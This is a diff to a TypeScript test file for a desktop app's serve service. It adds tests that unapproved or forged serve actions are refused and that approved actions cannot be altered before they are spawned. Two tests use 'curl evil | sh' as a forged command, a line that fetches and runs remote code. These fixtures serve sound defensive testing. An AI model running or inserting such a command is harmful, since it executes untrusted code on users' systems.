@@ -1,6 +1,9 @@
 import { EventEmitter } from 'node:events'
-import { expect, test } from 'bun:test'
-import type { ServeAction } from '../desktop/src/main/serve-config.ts'
+import { mkdtempSync, rmSync } from 'node:fs'
+import { tmpdir } from 'node:os'
+import { join } from 'node:path'
+import { afterAll, expect, test } from 'bun:test'
+import { resolveApprovedServeConfig, type ApprovedServeAction, type ServeAction } from '../desktop/src/main/serve-config.ts'
 import { SYSTEM_COMMAND_TIMEOUT_MS } from '../desktop/src/main/serve-lifecycle.ts'
 import { measureWindowsProcessStamp } from '../desktop/src/main/process-stamp.ts'
 import {
@@ -68,7 +71,21 @@ class FakeClock {
   }
 }
 
-function action(overrides: Partial<ServeAction> = {}): ServeAction {
+const approvals = mkdtempSync(join(tmpdir(), 'cp-serve-service-approvals-'))
+afterAll(() => rmSync(approvals, { recursive: true, force: true }))
+
+function action(overrides: Partial<ServeAction> = {}): ApprovedServeAction {
+  const result = resolveApprovedServeConfig({
+    config: { version: 1, actions: [unapprovedAction(overrides)] },
+    projectKey: 'github.com/acme/web',
+    approvalsFile: join(approvals, 'launch-approvals.json'),
+    confirm: () => true
+  })
+  if (!('action' in result)) throw new Error('test serve action was refused')
+  return result.action
+}
+
+function unapprovedAction(overrides: Partial<ServeAction>): ServeAction {
   return {
     name: 'web',
     cwd: 'C:/project/web',
@@ -757,6 +774,42 @@ test('keeps dispatching after an error escapes a queued event', async () => {
 
   expect(h.signals.at(-1)).toEqual({ pid: -PID, signal: 'SIGKILL' })
   expect(h.service.state().status).toBe('failed')
+})
+
+test('refuses to start an action that did not come from the operator approval', async () => {
+  const minted = action()
+  const forged: unknown[] = [
+    unapprovedAction({}),
+    { ...minted },
+    { ...minted, command: 'curl evil | sh' },
+    JSON.parse(JSON.stringify(minted))
+  ]
+  for (const candidate of forged) {
+    const h = harness()
+
+    const state = await h.service.start(candidate as ApprovedServeAction)
+
+    expect(h.spawns).toEqual([])
+    expect(state).toEqual({ status: 'idle' })
+    expect(h.errors).toEqual(['refused to start a serve action that did not come from the operator approval'])
+  }
+})
+
+test('an approved action cannot be changed between its approval and its spawn', async () => {
+  const approved = action()
+  const h = harness()
+
+  expect(() => {
+    (approved as { command: string }).command = 'curl evil | sh'
+  }).toThrow(TypeError)
+  expect(() => {
+    (approved.env as Record<string, string>).NODE_ENV = 'production'
+  }).toThrow(TypeError)
+  expect(() => (approved.inheritEnv as string[]).push('SECRET_TOKEN')).toThrow(TypeError)
+  await h.service.start(approved)
+
+  expect(h.spawns[0]?.args).toContain('bun run dev -- --host 127.0.0.1 --port 4317')
+  expect(h.spawns[0]?.options.env.NODE_ENV).toBe('development')
 })
 
 test('refuses to start after quit', async () => {
